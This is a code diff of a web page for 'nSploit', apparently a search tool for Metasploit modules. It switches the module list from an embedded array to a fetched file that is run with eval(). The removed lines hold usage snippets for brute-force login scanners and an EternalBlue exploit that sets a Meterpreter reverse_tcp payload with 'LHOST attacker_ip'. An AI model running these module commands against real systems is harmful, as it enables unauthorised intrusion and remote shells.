@@ -275,8 +275,44 @@
 
     <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js"></script>
     <script>
-        // Embedded modules database - guaranteed to work on Netlify
-        const MODULES_DB = [
+        // Simple solution: Load modules_data.js content directly with fetch
+        let MODULES_DB = [];
+        let modulesLoaded = false;
+        
+        // Try to load the external file
+        fetch('./modules_data.js')
+            .then(response => {
+                if (!response.ok) throw new Error('Network response was not ok');
+                return response.text();
+            })
+            .then(data => {
+                // Execute the JavaScript content
+                eval(data);
+                modulesLoaded = true;
+                console.log('✅ Successfully loaded', MODULES_DB.length, 'modules');
+                if (document.readyState === 'loading') {
+                    document.addEventListener('DOMContentLoaded', initApp);
+                } else {
+                    initApp();
+                }
+            })
+            .catch(error => {
+                console.error('❌ Failed to load modules_data.js:', error);
+                console.log('⚠️ The site will work locally but may have issues on Netlify');
+                // Initialize with empty array - the original script tag might still work
+                if (document.readyState === 'loading') {
+                    document.addEventListener('DOMContentLoaded', initApp);
+                } else {
+                    initApp();
+                }
+            });
+    </script>
+    <script src="modules_data.js?v=3.4"></script>
+    <script>
+        let allModules = [];
+        
+        // Fallback modules in case external file fails to load
+        const FALLBACK_MODULES = [
             {
                 "name": "TCP Port Scanner",
                 "path": "auxiliary/scanner/portscan/tcp",
@@ -288,146 +324,84 @@
                 "options": ["RHOSTS", "PORTS", "THREADS", "TIMEOUT"]
             },
             {
-                "name": "SYN Port Scanner",
-                "path": "auxiliary/scanner/portscan/syn",
-                "category": "Port Scanning",
-                "description": "Fast SYN port scanner for stealth scanning",
-                "targets": ["Any", "Network"],
-                "tags": ["syn", "port", "scan", "stealth", "fast"],
-                "usage": "use auxiliary/scanner/portscan/syn\nset RHOSTS target_ip\nset PORTS 1-65535\nrun",
-                "options": ["RHOSTS", "PORTS", "INTERFACE", "SNAPLEN"]
-            },
-            {
                 "name": "SMB Version Scanner",
                 "path": "auxiliary/scanner/smb/smb_version",
                 "category": "Service Scanning",
-                "description": "Scan for SMB version information",
-                "targets": ["Windows", "SMB"],
-                "tags": ["smb", "windows", "version", "netbios"],
+                "description": "Detect SMB version information",
+                "targets": ["Windows", "Linux", "Network"],
+                "tags": ["smb", "version", "scan", "windows"],
                 "usage": "use auxiliary/scanner/smb/smb_version\nset RHOSTS target_ip\nrun",
-                "options": ["RHOSTS", "SMBUser", "SMBPass", "SMBDomain"]
-            },
-            {
-                "name": "HTTP Version Scanner",
-                "path": "auxiliary/scanner/http/http_version",
-                "category": "Web Scanning",
-                "description": "Scan for HTTP server version information",
-                "targets": ["Web", "HTTP"],
-                "tags": ["http", "version", "web", "fingerprint"],
-                "usage": "use auxiliary/scanner/http/http_version\nset RHOSTS target_ip\nrun",
-                "options": ["RHOSTS", "RPORT", "VHOST", "SSL"]
-            },
-            {
-                "name": "MS17-010 EternalBlue Scanner",
-                "path": "auxiliary/scanner/smb/smb_ms17_010",
-                "category": "Vulnerability Scanning",
-                "description": "Scan for MS17-010 EternalBlue vulnerability",
-                "targets": ["Windows", "SMB"],
-                "tags": ["ms17-010", "eternalblue", "smb", "vulnerability"],
-                "usage": "use auxiliary/scanner/smb/smb_ms17_010\nset RHOSTS target_ip\nrun",
-                "options": ["RHOSTS", "CHECK_ARCH", "CHECK_DOPU", "CHECK_PIPE"]
-            },
-            {
-                "name": "SSH Login Scanner",
-                "path": "auxiliary/scanner/ssh/ssh_login",
-                "category": "Brute Force",
-                "description": "Brute force SSH login credentials",
-                "targets": ["Linux", "Unix", "SSH"],
-                "tags": ["ssh", "login", "brute-force", "credentials"],
-                "usage": "use auxiliary/scanner/ssh/ssh_login\nset RHOSTS target_ip\nrun",
-                "options": ["RHOSTS", "RPORT", "USERNAME", "PASSWORD", "PASS_FILE", "USER_FILE"]
-            },
-            {
-                "name": "MySQL Login Scanner",
-                "path": "auxiliary/scanner/mysql/mysql_login",
-                "category": "Database Scanning",
-                "description": "Brute force MySQL login credentials",
-                "targets": ["Database", "MySQL"],
-                "tags": ["mysql", "database", "login", "brute-force"],
-                "usage": "use auxiliary/scanner/mysql/mysql_login\nset RHOSTS target_ip\nrun",
-                "options": ["RHOSTS", "RPORT", "USERNAME", "PASSWORD", "PASS_FILE"]
-            },
-            {
-                "name": "Directory Scanner",
-                "path": "auxiliary/scanner/http/dir_scanner",
-                "category": "Web Scanning",
-                "description": "Scan for common directories on web servers",
-                "targets": ["Web", "HTTP"],
-                "tags": ["directory", "web", "enumeration", "brute-force"],
-                "usage": "use auxiliary/scanner/http/dir_scanner\nset RHOSTS target_ip\nrun",
-                "options": ["RHOSTS", "RPORT", "PATH", "DICTIONARY"]
-            },
-            {
-                "name": "EternalBlue Exploit",
-                "path": "exploit/windows/smb/ms17_010_eternalblue",
-                "category": "Windows Exploits",
-                "description": "Exploit MS17-010 EternalBlue vulnerability for remote code execution",
-                "targets": ["Windows", "SMB"],
-                "tags": ["ms17-010", "eternalblue", "rce", "smb"],
-                "usage": "use exploit/windows/smb/ms17_010_eternalblue\nset RHOSTS target_ip\nset payload windows/x64/meterpreter/reverse_tcp\nset LHOST attacker_ip\nrun",
-                "options": ["RHOSTS", "RPORT", "GroomAllocations", "GroomDelta"]
-            },
-            {
-                "name": "Windows Meterpreter Reverse TCP",
-                "path": "payload/windows/meterpreter/reverse_tcp",
-                "category": "Windows Payloads",
-                "description": "Windows Meterpreter (Reflective Injection), Reverse TCP Stager",
-                "targets": ["Windows"],
-                "tags": ["meterpreter", "reverse", "tcp", "windows"],
-                "usage": "set payload windows/meterpreter/reverse_tcp\nset LHOST attacker_ip\nset LPORT 4444",
-                "options": ["LHOST", "LPORT", "EXITFUNC"]
-            },
-            {
-                "name": "OpenSSL Heartbleed Scanner",
-                "path": "auxiliary/scanner/ssl/openssl_heartbleed",
-                "category": "Vulnerability Scanning",
-                "description": "Scan for OpenSSL Heartbleed vulnerability (CVE-2014-0160)",
-                "targets": ["SSL", "TLS", "Any"],
-                "tags": ["heartbleed", "ssl", "tls", "cve-2014-0160"],
-                "usage": "use auxiliary/scanner/ssl/openssl_heartbleed\nset RHOSTS target_ip\nrun",
-                "options": ["RHOSTS", "RPORT", "TLS_CALLBACK", "TLS_VERSION"]
-            },
-            {
-                "name": "SMB Share Scanner",
-                "path": "auxiliary/scanner/smb/smb_enumshares",
-                "category": "Service Scanning",
-                "description": "Enumerate SMB shares on target systems",
-                "targets": ["Windows", "SMB"],
-                "tags": ["smb", "shares", "enumeration", "windows"],
-                "usage": "use auxiliary/scanner/smb/smb_enumshares\nset RHOSTS target_ip\nrun",
-                "options": ["RHOSTS", "SMBUser", "SMBPass", "SMBDomain", "ShowFiles"]
+                "options": ["RHOSTS", "THREADS"]
             }
         ];
 
-        let allModules = [];
-
         // Initialize the application
-        document.addEventListener('DOMContentLoaded', function() {
+        function initApp() {
             try {
-                allModules = MODULES_DB;
-                console.log('✅ Loaded', allModules.length, 'embedded modules successfully');
-                
-                loadCategories();
-                loadTargets();
-                document.getElementById('totalModules').textContent = allModules.length;
-                
+                // Check if we have modules loaded
+                if (typeof MODULES_DB !== 'undefined' && MODULES_DB.length > 0) {
+                    allModules = MODULES_DB;
+                    console.log('✅ Using', allModules.length, 'modules from database');
+                } else {
+                    console.warn('❌ No modules found. Using fallback modules.');
+                    allModules = FALLBACK_MODULES;
+                    showWarning('Using limited module set. Full database may not have loaded properly.');
+                }
+
                 // Event listeners
                 document.getElementById('searchBtn').addEventListener('click', performSearch);
                 document.getElementById('clearBtn').addEventListener('click', clearResults);
                 document.getElementById('searchQuery').addEventListener('keypress', function(e) {
                     if (e.key === 'Enter') performSearch();
                 });
+
+                loadCategories();
+                loadTargets();
+                document.getElementById('totalModules').textContent = allModules.length;
                 
-                console.log('🚀 nSploit initialized successfully with embedded modules');
+                console.log('nSploit initialized successfully');
             } catch (error) {
-                console.error('❌ Error initializing nSploit:', error);
+                console.error('Error initializing nSploit:', error);
                 showError('Error initializing application: ' + error.message);
             }
-        });
+        }
+
+        // Show error message to user
+        function showError(message) {
+            const container = document.getElementById('resultsContainer');
+            container.innerHTML = `
+                <div class="text-center text-danger">
+                    <i class="fas fa-exclamation-triangle fa-3x mb-3"></i>
+                    <h5>Error</h5>
+                    <p>${message}</p>
+                    <button class="btn btn-primary" onclick="location.reload()">
+                        <i class="fas fa-refresh"></i> Reload Page
+                    </button>
+                </div>
+            `;
+        }
+
+        // Show warning message to user
+        function showWarning(message) {
+            const container = document.getElementById('resultsContainer');
+            container.innerHTML = `
+                <div class="text-center text-warning">
+                    <i class="fas fa-exclamation-circle fa-3x mb-3"></i>
+                    <h5>Warning</h5>
+                    <p>${message}</p>
+                    <p><small>You can still search the available modules below.</small></p>
+                </div>
+            `;
+        }
 
         // Load categories
         function loadCategories() {
             try {
+                if (!allModules || allModules.length === 0) {
+                    console.error('No modules available for category loading');
+                    return;
+                }
+                
                 const categories = [...new Set(allModules.map(module => module.category))].sort();
                 const select = document.getElementById('categoryFilter');
                 
@@ -438,7 +412,7 @@
                     select.appendChild(option);
                 });
                 
-                console.log('📂 Loaded', categories.length, 'categories');
+                console.log('Loaded', categories.length, 'categories');
             } catch (error) {
                 console.error('Error loading categories:', error);
             }
@@ -447,6 +421,11 @@
         // Load targets
         function loadTargets() {
             try {
+                if (!allModules || allModules.length === 0) {
+                    console.error('No modules available for target loading');
+                    return;
+                }
+                
                 const targets = [...new Set(allModules.flatMap(module => module.targets))].sort();
                 const select = document.getElementById('targetFilter');
                 
@@ -457,7 +436,7 @@
                     select.appendChild(option);
                 });
                 
-                console.log('🎯 Loaded', targets.length, 'targets');
+                console.log('Loaded', targets.length, 'targets');
             } catch (error) {
                 console.error('Error loading targets:', error);
             }
@@ -466,6 +445,11 @@
         // Perform search
         function performSearch() {
             try {
+                if (!allModules || allModules.length === 0) {
+                    showError('No modules available for search. Please refresh the page.');
+                    return;
+                }
+                
                 const query = document.getElementById('searchQuery').value.toLowerCase();
                 const category = document.getElementById('categoryFilter').value;
                 const target = document.getElementById('targetFilter').value;
@@ -492,7 +476,7 @@
                     return true;
                 });
                 
-                console.log('🔍 Search completed:', results.length, 'results found');
+                console.log('Search completed:', results.length, 'results found');
                 displayResults(results);
                 document.getElementById('resultCount').textContent = results.length;
             } catch (error) {
@@ -594,21 +578,6 @@
                     document.body.removeChild(toast);
                 }, 2000);
             });
-        }
-
-        // Show error message to user
-        function showError(message) {
-            const container = document.getElementById('resultsContainer');
-            container.innerHTML = `
-                <div class="text-center text-danger">
-                    <i class="fas fa-exclamation-triangle fa-3x mb-3"></i>
-                    <h5>Error</h5>
-                    <p>${message}</p>
-                    <button class="btn btn-primary" onclick="location.reload()">
-                        <i class="fas fa-refresh"></i> Reload Page
-                    </button>
-                </div>
-            `;
         }
     </script>
 </body>
